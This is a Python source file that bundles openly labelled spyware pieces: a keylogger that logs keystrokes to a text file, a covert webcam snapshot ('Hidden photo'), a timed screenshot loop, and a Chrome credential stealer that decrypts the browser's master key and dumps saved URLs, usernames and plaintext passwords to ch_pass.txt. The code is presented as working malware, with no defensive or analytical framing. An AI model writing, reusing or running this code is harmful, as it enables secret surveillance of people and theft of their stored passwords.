# --------------Keylogger------------------
from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta

special_keys = {
    "Key.alt": "[alt]",
    "Key.alt_l": "[alt_left]",
    "Key.alt_r": "[alt_right]",
    "Key.backspace": "[backspace]",
    "Key.caps_lock": "[capslock]",
    "Key.cmd": "[cmd]",
    "Key.cmd_l": "[cmd_left]",
    "Key.cmd_r": "[cmd_right]",
    "Key.ctrl": "[ctrl]",
    "Key.ctrl_l": "[ctrl_left]",
    "Key.ctrl_r": "[ctrl_right]",
    "Key.delete": "[delete]",
    "Key.down": "[down]",
    "Key.end": "[end]",
    "Key.enter": "[enter]",
    "Key.esc": "[escape]",
    "Key.f1": "[f1]",
    "Key.f2": "[f2]",
    "Key.f3": "[f3]",
    "Key.f4": "[f4]",
    "Key.f5": "[f5]",
    "Key.f6": "[f6]",
    "Key.f7": "[f7]",
    "Key.f8": "[f8]",
    "Key.f9": "[f9]",
    "Key.f10": "[f10]",
    "Key.f11": "[f11]",
    "Key.f12": "[f12]",
    "Key.home": "[home]",
    "Key.insert": "[insert]",
    "Key.left": "[left]",
    "Key.page_down": "[page_down]",
    "Key.page_up": "[page_up]",
    "Key.right": "[right]",
    "Key.shift": "[shift]",
    "Key.shift_l": "[shift_left]",
    "Key.shift_r": "[shift_right]",
    "Key.space": "[space]",
    "Key.tab": "[tab]",
    "Key.up": "[up]",
    "<97>":"1",
    "<98>":"2",
    "<99>":"3",
    "<100>":"4",
    "<101>":"5",
    "<102>":"6",
    "<103>":"7",
    "<104>":"8",
    "<105>":"9"
}


def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]

    with open("hello.txt", "a") as f:
        f.write(listen)

stat = datetime.now()
end = stat + timedelta(seconds=60)
def on_release(key):
    if datetime.now() >=  end:
        return False
    return None

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
# --------------Hidden photo------------------
import cv2

cap = cv2.VideoCapture(0)
ret, frame = cap.read()
if ret:
    cv2.imwrite("po.jpg", frame)

cap.release()
cv2.destroyAllWindows()
# --------------Screenshot---------------------
import pyautogui
from time import sleep

user_1 = int(input("Enter a count screenshot : "))
user_2 = int(input("Enter a second count screenshot : "))

count = user_1
for i in range(1, count+1):

    sleep(user_2)

    my_Screenshot = pyautogui.screenshot()

    filename = 'screenshot' + str(i) + '.png'
    pyautogui.screenshot(filename)

    print(f"Screenshot [{i}] saved!")
# --------------Browser passwords---------------------
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import sys

def get_chrome_key():
    try:
        file_path = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Local State")
        with open(file_path, "r", encoding="utf-8") as f:
            jn_data = json.load(f)
        encrypted_key = base64.b64decode(jn_data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error retrieving Chrome key: {e}")
        sys.exit(1)

def decrypt_password(password, key):
    try:
        # Check if password is encrypted (starts with v10 or v11)
        if password.startswith(b"v10") or password.startswith(b"v11"):
            iv = password[3:15]
            ciphertext = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)[:-16].decode()
            return decrypted
        else:
            # Likely unencrypted or older format
            return password.decode()
    except Exception as e:
        return f"<Decryption Failed: {e}>"

def main():
    try:
        # Get decryption key
        key = get_chrome_key()

        # Copy Chrome's Login Data database
        db_path = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
        file_name = "ch_pass.db"
        shutil.copy(db_path, file_name)

        # Connect to database
        with sqlite3.connect(file_name) as db:
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins ORDER BY date_last_used")
            rows = cursor.fetchall()

            # Write decrypted passwords to file
            with open("ch_pass.txt", "w", encoding="utf-8") as pf:
                for row in rows:
                    origin_url, action_url, username, password = row
                    if username and password:  # Skip empty entries
                        decrypted_password = decrypt_password(password, key)
                        pf.write(f"URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}\n")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Clean up
        if os.path.exists(file_name):
            os.remove(file_name)

if __name__ == "__main__":
    main()
